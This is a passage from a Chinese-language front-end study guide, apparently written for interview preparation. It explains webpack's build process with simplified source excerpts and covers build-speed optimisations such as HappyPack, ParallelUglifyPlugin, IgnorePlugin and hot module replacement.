</code></pre></div><p><strong>总结:</strong></p> <ul><li><strong>模块机制</strong>: <code>webpack</code>自己实现了一套模拟模块的机制，将其包裹于业务代码的外部，从而提供了一套模块机制；</li> <li><strong>文件编译</strong>: <code>webpack</code>规定了一套编译规则，通过 <code>Loader</code> 和 <code>Plugin</code>，以管道的形式对文件字符串进行处理；</li></ul> <p><strong>1.4 webpack的打包原理</strong></p> <ul><li><code>初始化参数</code>：从配置文件和 <code>Shell</code> 语句中读取与合并参数，得出最终的参数</li> <li><code>开始编译</code>：用上一步得到的参数初始化 <code>Compiler</code> 对象，加载所有配置的插件，执行对象的 <code>run</code> 方法开始执行编译</li> <li><code>确定入口</code>：根据配置中的 <code>entry</code> 找出所有的入口文件</li> <li><code>编译模块</code>：从入口文件出发，调用所有配置的 <code>Loader</code> 对模块进行翻译，再找出该模块依赖的模块，再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理</li> <li><code>完成模块编译</code>：在经过第<code>4</code>步使用 <code>Loader</code> 翻译完所有模块后，得到了每个模块被翻译后的最终内容以及它们之间的依赖关系</li> <li><code>输出资源</code>：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 <code>Chunk</code>，再把每个 <code>Chunk</code> 转换成一个单独的文件加入到输出列表，这步是可以修改输出内容的最后机会</li> <li><code>输出完成</code>：在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统</li></ul> <p><strong>1.5 webpack的打包原理详细</strong></p> <p><strong>相关问题</strong></p> <ul><li><code>webpack</code> 工作流程是怎样的</li> <li><code>webpack</code> 在不同阶段做了什么事情</li></ul> <p>webpack 是一种模块打包工具，可以将各类型的资源，例如图片、CSS、JS 等，转译组合为 JS 格式的 <code>bundle</code> 文件</p> <p><strong>webpack 构建的核心任务是完成内容转化和资源合并。主要包含以下 3 个阶段：</strong></p> <ol><li>初始化阶段</li></ol> <ul><li><strong>初始化参数</strong>：从配置文件、配置对象和 Shell 参数中读取并与默认参数进行合并，组合成最终使用的参数</li> <li><strong>创建编译对象</strong>：用上一步得到的参数创建 <code>Compiler</code> 对象。</li> <li><strong>初始化编译环境</strong>：包括注入内置插件、注册各种模块工厂、初始化 <code>RuleSet</code> 集合、加载配置的插件等</li></ul> <ol start="2"><li>构建阶段</li></ol> <ul><li><strong>开始编译</strong>：执行 <code>Compiler</code> 对象的 <code>run</code> 方法，创建 <code>Compilation</code> 对象。</li> <li><strong>确认编译入口</strong>：进入 <code>entryOption</code> 阶段，读取配置的 <code>Entries</code>，递归遍历所有的入口文件，调用 <code>Compilation.addEntry</code> 将入口文件转换为 Dependency 对象。</li> <li><strong>编译模块（make）</strong>： 调用 <code>normalModule</code> 中的 <code>build</code> 开启构建，从 <code>entry</code> 文件开始，调用 <code>loader</code> 对模块进行转译处理，然后调用 JS 解释器（<code>acorn</code>）将内容转化为 <code>AST</code> 对象，然后递归分析依赖，依次处理全部文件。</li> <li><strong>完成模块编译</strong>：在上一步处理好所有模块后，得到模块编译产物和依赖关系图</li></ul> <ol start="3"><li>生成阶段</li></ol> <ul><li><strong>输出资源（seal）</strong>：根据入口和模块之间的依赖关系，组装成多个包含多个模块的 <code>Chunk</code>，再把每个 <code>Chunk</code> 转换成一个 <code>Asset</code> 加入到输出列表，这步是可以修改输出内容的最后机会。</li> <li><strong>写入文件系统（emitAssets）</strong>：确定好输出内容后，根据配置的 <code>output</code> 将内容写入文件系统</li></ul> <p><strong>知识点深入</strong></p> <p><strong>1. webpack 初始化过程</strong></p> <p>从 webpack 项目 <code>webpack.config.js</code> 文件 webpack 方法出发，可以看到初始化过程如下：</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/195112577f1777bf.png" loading="lazy" class="lazy"></p> <ul><li>将命令行参数和用户的配置文件进行合并</li> <li>调用 <code>getValidateSchema</code> 对配置进行校验</li> <li>调用 <code>createCompiler</code> 创建 <code>Compiler</code> 对象
<ul><li>将用户配置和默认配置进行合并处理</li> <li>实例化 <code>Compiler</code></li> <li>实例化 <code>NodeEnvironmentPlugin</code></li> <li>处理用户配置的 <code>plugins</code>，执行 <code>plugin</code> 的 <code>apply</code> 方法。</li> <li>触发 <code>environment</code> 和 <code>afterEnvironment</code> 上注册的事件。</li> <li>注册 <code>webpack</code> 内部插件。</li> <li>触发 <code>initialize</code> 事件</li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// lib/webpack.js 122 行 部分代码省略处理</span>
<span class="token keyword">const</span> <span class="token function-variable function">create</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">webpackOptionsSchemaCheck</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 校验参数</span>
    <span class="token function">getValidateSchema</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>webpackOptionsSchema<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 创建 compiler 对象</span>
  compiler <span class="token operator">=</span> <span class="token function">createCompiler</span><span class="token punctuation">(</span>webpackOptions<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// lib/webpack.js 57 行</span>
<span class="token keyword">const</span> <span class="token function-variable function">createCompiler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">rawOptions</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 统一合并处理参数</span>
  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token function">getNormalizedWebpackOptions</span><span class="token punctuation">(</span>rawOptions<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">applyWebpackOptionsBaseDefaults</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 实例化 compiler</span>
  <span class="token keyword">const</span> compiler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Compiler</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 把 options 挂载到对象上</span>
  compiler<span class="token punctuation">.</span>options <span class="token operator">=</span> options<span class="token punctuation">;</span>
  <span class="token comment">// NodeEnvironmentPlugin 是对 fs 模块的封装，用来处理文件输入输出等</span>
  <span class="token keyword">new</span> <span class="token class-name">NodeEnvironmentPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">infrastructureLogging</span><span class="token operator">:</span> options<span class="token punctuation">.</span>infrastructureLogging<span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>compiler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 注册用户配置插件</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>plugins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugin <span class="token keyword">of</span> options<span class="token punctuation">.</span>plugins<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> plugin <span class="token operator">===</span> <span class="token string">&quot;function&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">plugin</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>compiler<span class="token punctuation">,</span> compiler<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">plugin</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>compiler<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">applyWebpackOptionsDefaults</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 触发 environment 和 afterEnvironment 上注册的事件</span>
  compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">.</span><span class="token function">environment</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">.</span><span class="token function">afterEnvironment</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 注册 webpack 内置插件</span>
  <span class="token keyword">new</span> <span class="token class-name">WebpackOptionsApply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> compiler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  compiler<span class="token punctuation">.</span>hooks<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> compiler<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p><strong>2. webpack 构建阶段做了什么</strong></p> <p>在 webpack 函数执行完之后，就到主要的构建阶段，首先执行 <code>compiler.run()</code>，然后触发一系列钩子函数，执行 <code>compiler.compile()</code></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/09/2b1da6bb8a3fd972.png" loading="lazy" class="lazy"></p> <ul><li>在实例化 <code>compiler</code> 之后，执行 <code>compiler.run()</code></li> <li>执行 <code>newCompilation</code> 函数，调用 <code>createCompilation</code> 初始化 <code>Compilation</code> 对象</li> <li>执行 <code>_addEntryItem</code> 将入口文件存入 <code>this.entries</code>（<code>map</code> 对象），遍历 <code>this.entries</code> 对象构建 <code>chunk</code>。</li> <li>执行 <code>handleModuleCreation</code>，开始创建模块实例。</li> <li>执行 <code>moduleFactory.create</code> 创建模块
<ul><li>执行 <code>factory.hooks.factorize.call</code> 钩子，然后会调用 <code>ExternalModuleFactoryPlugin</code> 中注册的钩子，用于配置外部文件的模块加载方式</li> <li>使用 <code>enhanced-resolve</code> 解析模块和 <code>loader</code> 的真实绝对路径</li> <li>执行 <code>new NormalModule()</code> 创建 <code>module</code> 实例</li></ul></li> <li>执行 <code>addModule</code>，存储 <code>module</code></li> <li>执行 <code>buildModule</code>，添加模块到模块队列 <code>buildQueue</code>，开始构建模块, 这里会调用 <code>normalModule</code> 中的 <code>build</code> 开启构建
<ul><li>创建 <code>loader</code> 上下文。</li> <li>执行 <code>runLoaders</code>，通过 <code>enhanced-resolve</code> 解析得到的模块和 <code>loader</code> 的路径获取函数，执行 <code>loader</code>。</li> <li>生成模块的 <code>hash</code></li></ul></li> <li>所有依赖都解析完毕后，构建阶段结束</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>  <span class="token comment">// 构建过程涉及流程比较复杂，代码会做省略</span>

  <span class="token comment">// lib/webpack.js 1284行</span>
  <span class="token comment">// 开启编译流程</span>
  compiler<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stats</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    compiler<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token parameter">err2</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">callback</span><span class="token punctuation">(</span>err <span class="token operator">||</span> err2<span class="token punctuation">,</span> stats<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// lib/compiler.js 1081行</span>
  <span class="token comment">// 开启编译流程</span>
  <span class="token function">compile</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">newCompilationParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 创建 Compilation 对象</span>
    <span class="token keyword">const</span> Compilation <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">newCompilation</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1865行</span>
  <span class="token comment">// 确认入口文件</span>
  <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_addEntryItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1834行</span>
  <span class="token comment">// 开始创建模块流程，创建模块实例</span>
  <span class="token function">addModuleTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleModuleCreation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1548行</span>
  <span class="token comment">// 开始创建模块流程，创建模块实例</span>
  <span class="token function">handleModuleCreation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">factorizeModule</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1712行</span>
  <span class="token comment">// 添加到创建模块队列，执行创建模块</span>
  <span class="token function">factorizeModule</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>factorizeQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1834行</span>
  <span class="token comment">// 保存需要构建模块</span>
  <span class="token function">_addModule</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>modules<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// lib/Compilation.js 1284行</span>
  <span class="token comment">// 添加模块进模块编译队列，开始编译</span>
  <span class="token function">buildModule</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>buildQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre></div><p><strong>3. webpack 生成阶段做了什么</strong></p> <blockquote><p>构建阶段围绕 <code>module</code> 展开，生成阶段则围绕 <code>chunks</code> 展开。经过构建阶段之后，webpack 得到足够的模块内容与模块关系信息，之后通过 <code>Compilation.seal</code> 函数生成最终资源</p></blockquote> <p><strong>3.1 生成产物</strong></p> <p>执行 <code>Compilation.seal</code> 进行产物的封装</p> <ul><li>构建本次编译的 <code>ChunkGraph</code> 对象，执行 <code>buildChunkGraph</code>，这里会将 <code>import()</code>、<code>require.ensure</code> 等方法生成的动态模块添加到 <code>chunks</code> 中</li> <li>遍历 <code>Compilation.modules</code> 集合，将 <code>module</code> 按 <strong><code>entry</code>/动态引入</strong> 的规则分配给不同的 <code>Chunk</code> 对象。</li> <li>调用 <code>Compilation.emitAssets</code> 方法将 <code>assets</code> 信息记录到 <code>Compilation.assets</code> 对象中。</li> <li>执行 <code>hooks.optimizeChunkModules</code> 的钩子，这里开始进行代码生成和封装。
<ul><li>执行一系列钩子函数（<code>reviveModules</code>, <code>moduleId</code>, <code>optimizeChunkIds</code> 等）</li> <li>执行 <code>createModuleHashes</code> 更新模块 <code>hash</code></li> <li>执行 <code>JavascriptGenerator</code> 生成模块代码，这里会遍历 <code>modules</code>，创建构建任务，循环使用 <code>JavascriptGenerator</code> 构建代码，这时会将 <code>import</code> 等模块引入方式替换为 <code>webpack_require</code> 等，并将生成结果存入缓存</li> <li>执行 <code>processRuntimeRequirements</code>，根据生成的内容所使用到的 <code>webpack_require</code> 的函数，添加对应的代码</li> <li>执行 <code>createHash</code> 创建 <code>chunk</code> 的 <code>hash</code></li> <li>执行 <code>clearAssets</code> 清除 <code>chunk</code> 的 <code>files</code> 和 <code>auxiliary</code>，这里缓存的是生成的 <code>chunk</code> 的文件名，主要是清除上次构建产生的废弃内容</li></ul></li></ul> <p><strong>3.2 文件输出</strong></p> <p>回到 <code>Compiler</code> 的流程中，执行 <code>onCompiled</code> 回调。</p> <ul><li>触发 <code>shouldEmit</code> 钩子函数，这里是最后能优化产物的钩子。</li> <li>遍历 <code>module</code> 集合，根据 <code>entry</code> 配置及引入资源的方式，将 <code>module</code> 分配到不同的 <code>chunk</code>。</li> <li>遍历 <code>chunk</code> 集合，调用 <code>Compilation.emitAsset</code> 方法标记 <code>chunk</code> 的输出规则，即转化为 <code>assets</code> 集合。</li> <li>写入本地文件，用的是 webpack 函数执行时初始化的文件流工具。</li> <li>执行 <code>done</code> 钩子函数，这里会执行 <code>compiler.run()</code> 的回调，再执行 <code>compiler.close()</code>，然后执行持久化存储（前提是使用的 <code>filesystem</code> 缓存模式）</li></ul> <p><strong>1.6 总结</strong></p> <ol><li><strong>初始化参数</strong>：从配置文件和 <code>Shell</code> 语句中读取并合并参数，得出最终的配置参数。</li> <li><strong>开始编译</strong>：从上一步得到的参数初始化 <code>Compiler</code> 对象，加载所有配置的插件，执行对象的 <code>run</code> 方法开始执行编译。</li> <li><strong>确定入口</strong>：根scope据配置中的 <code>entry</code> 找出所有的入口文件。</li> <li><strong>编译模块</strong>：从入口文件出发，调用所有配置的 <code>loader</code> 对模块进行翻译，再找出该模块依赖的模块，这个步骤是递归执行的，直至所有入口依赖的模块文件都经过本步骤的处理。</li> <li><strong>完成模块编译</strong>：经过第 <code>4</code> 步使用 <code>loader</code> 翻译完所有模块后，得到了每个模块被翻译后的最终内容以及它们之间的依赖关系。</li> <li><strong>输出资源</strong>：根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 <code>chunk</code>，再把每个 <code>chunk</code> 转换成一个单独的文件加入到输出列表，这一步是可以修改输出内容的最后机会。</li> <li><strong>输出完成</strong>：在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统。</li></ol> <h3 id="webpack性能优化-构建速度"><a href="#webpack性能优化-构建速度" class="header-anchor">#</a> webpack性能优化-构建速度</h3> <blockquote><p>先分析遇到哪些问题，在配合下面的方法优化，不要上来就回答，让人觉得背面试题</p></blockquote> <ul><li>优化<code>babel-loader</code>缓存
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/a9f33d5b7fb0dfad.png" loading="lazy" class="lazy"></li> <li><code>IgnorePlugin</code> 忽略某些包，避免引入无用模块（直接不引入，需要在代码中引入）
<ul><li><code>import moment from 'moment'</code></li> <li>默认会引入所有语言JS代码，代码过大</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> moment <span class="token keyword">from</span> <span class="token string">'moment'</span>
moment<span class="token punctuation">.</span><span class="token function">locale</span><span class="token punctuation">(</span><span class="token string">'zh-cn'</span><span class="token punctuation">)</span> <span class="token comment">// 设置语言为中文</span>

<span class="token comment">// 手动引入中文语言包</span>
<span class="token keyword">import</span> <span class="token string">'moment/locale/zh-cn'</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.prod.js</span>
<span class="token literal-property property">pluins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// 忽略 moment 下的 /locale 目录</span>
    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>IgnorePlugin</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\/locale</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">moment</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
</code></pre></div></li> <li><code>noParse</code> 避免重复打包（引入但不打包）
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/0a9cd08a1e89e2f1.png" loading="lazy" class="lazy"></li> <li><code>happyPack</code>多线程打包
<ul><li>JS单线程的，开启多进程打包</li> <li>提高构建速度(特别是多核<code>CPU</code>)</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>  <span class="token comment">// webpack.prod.js</span>
  <span class="token keyword">const</span> HappyPack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'happypack'</span><span class="token punctuation">)</span>

  <span class="token punctuation">{</span>
      <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
              <span class="token comment">// js</span>
              <span class="token punctuation">{</span>
                  <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                  <span class="token comment">// 把对 .js 文件的处理转交给 id 为 babel 的 HappyPack 实例</span>
                  <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'happypack/loader?id=babel'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                  <span class="token literal-property property">include</span><span class="token operator">:</span> srcPath<span class="token punctuation">,</span>
                  <span class="token comment">// exclude: /node_modules/</span>
              <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token punctuation">]</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token comment">// happyPack 开启多进程打包</span>
          <span class="token keyword">new</span> <span class="token class-name">HappyPack</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
              <span class="token comment">// 用唯一的标识符 id 来代表当前的 HappyPack 是用来处理一类特定的文件</span>
              <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'babel'</span><span class="token punctuation">,</span>
              <span class="token comment">// 如何处理 .js 文件，用法和 Loader 配置中一样</span>
              <span class="token literal-property property">loaders</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader?cacheDirectory'</span><span class="token punctuation">]</span>
          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
</code></pre></div></li> <li><code>parallelUglifyPlugin</code>多进程压缩<code>JS</code> <ul><li><strong>关于多进程</strong> <ul><li>项目较大，打包较慢，开启多进程能提高速度</li> <li>项目较小，打包很快，开启多进程反而会降低速度（进程开销）</li> <li>按需使用</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.prod.js</span>
<span class="token keyword">const</span> ParallelUglifyPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-parallel-uglify-plugin'</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token comment">// 使用 ParallelUglifyPlugin 并行压缩输出的 JS 代码</span>
        <span class="token keyword">new</span> <span class="token class-name">ParallelUglifyPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// 传递给 UglifyJS 的参数</span>
            <span class="token comment">// （还是使用 UglifyJS 压缩，只不过帮助开启了多进程）</span>
            <span class="token literal-property property">uglifyJS</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">beautify</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 最紧凑的输出</span>
                    <span class="token literal-property property">comments</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 删除所有的注释</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token literal-property property">compress</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 删除所有的 `console` 语句，可以兼容ie浏览器</span>
                    <span class="token literal-property property">drop_console</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    <span class="token comment">// 内嵌定义了但是只用到一次的变量</span>
                    <span class="token literal-property property">collapse_vars</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    <span class="token comment">// 提取出出现多次但是没有定义成变量去引用的静态值</span>
                    <span class="token literal-property property">reduce_vars</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li>自动刷新（开发环境）使用<code>dev-server</code>即可
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/d88cc6944c88ef16.png" loading="lazy" class="lazy"></li> <li>热更新（开发环境）
<ul><li><p>自动刷新：整个网页全部刷新，速度较慢，状态会丢失</p></li> <li><p>热更新：新代码生效，网页不刷新，状态不丢失</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// webpack.dev.js</span>
<span class="token keyword">const</span> HotModuleReplacementPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack/lib/HotModuleReplacementPlugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token literal-property property">entry</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token comment">// index: path.join(srcPath, 'index.js'),</span>
    <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token string">'webpack-dev-server/client?http://localhost:8080/'</span><span class="token punctuation">,</span>
        <span class="token string">'webpack/hot/dev-server'</span><span class="token punctuation">,</span>
        path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'index.js'</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">other</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>srcPath<span class="token punctuation">,</span> <span class="token string">'other.js'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">hot</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token class-name">HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 代码中index.js</span>

<span class="token comment">// 增加，开启热更新之后的代码逻辑</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">.</span>hot<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 注册哪些模块需要热更新</span>
    module<span class="token punctuation">.</span>hot<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./math'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> sumRes <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'sumRes in hot'</span><span class="token punctuation">,</span> sumRes<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li><code>DllPlugin</code> 动态链接库（<code>dllPlugin</code>只适用于开发环境,因为生产环境下打包一次就完了,没有必要用于生产环境）
